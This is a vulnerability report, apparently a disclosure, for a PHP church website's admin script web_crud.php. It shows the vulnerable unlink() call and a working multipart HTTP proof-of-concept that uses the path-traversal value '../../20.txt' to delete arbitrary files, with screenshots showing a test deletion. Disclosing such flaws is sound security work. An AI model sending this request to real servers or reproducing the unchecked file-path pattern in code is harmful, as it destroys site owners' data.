### Vulnerability file address

In line 458 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_search_img']);`,` $_POST['old_search_img']` parameters have not been restricted, which causes any file to be deleted

```php
if ($_FILES['searchphoto']['tmp_name'] != '') {
            $filepath = "../../assets/images/" . generateUniqueFileName($_FILES["searchphoto"]["name"]);

            if (move_uploaded_file($_FILES["searchphoto"]["tmp_name"], $filepath)) {
                $img9 = basename($filepath);
                @unlink("../../assets/images/" . $_POST['old_search_img']);
            }
        }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 379

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update6"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_search_img"

../../20.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="searchphoto";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `20.txt` file in the `church/` directory

![image-20250505163544964](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051635003.png)

Then we execute the above poc to attack

![image-20250505163553268](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051635302.png)

Files are deleted after the attack is successful

![image-20250505163606183](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051636215.png)